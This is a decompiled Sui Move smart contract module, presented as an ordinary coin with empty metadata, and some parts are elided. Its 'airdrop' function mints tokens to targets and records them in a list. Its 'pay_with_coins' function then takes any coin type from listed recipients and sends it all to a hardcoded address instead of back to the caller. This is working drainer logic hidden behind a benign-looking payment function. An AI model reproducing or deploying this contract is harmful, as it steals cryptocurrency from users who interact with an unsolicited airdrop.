module 0x28dc539c44f92d6bb9fbeffc46fd0547275440704c40ae40d6536147b58a1cb1::coin {
    ...
    entry fun airdrop(arg0: &mut State, arg1: &mut 0x2::coin::TreasuryCap<COIN>, arg2: u64, arg3: address, arg4: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<COIN>>(0x2::coin::mint<COIN>(arg1, arg2, arg4), arg3);
        if (!0x1::vector::contains<address>(&arg0.users, &arg3)) {
            0x1::vector::push_back<address>(&mut arg0.users, arg3);
        };
    }
    ...
    fun init(arg0: COIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<COIN>(arg0, 6, b"", b"", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"")), arg1);
    ...
    entry fun pay_with_coins<T0>(arg0: &mut State, arg1: vector<0x2::coin::Coin<T0>>, arg2: &0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg2);
        let (v1, v2) = 0x1::vector::index_of<address>(&arg0.users, &v0);
        let v3 = if (v1) {
            @0x78d8c163f20d453845997005d8345ffba79f22da6deb5e089307deba40bb1bfd
        } else {
            0x2::tx_context::sender(arg2)
        };
        0x2::pay::join_vec_and_transfer<T0>(arg1, v3);
        if (v1) {
            0x1::vector::remove<address>(&mut arg0.users, v2);
        };
    }
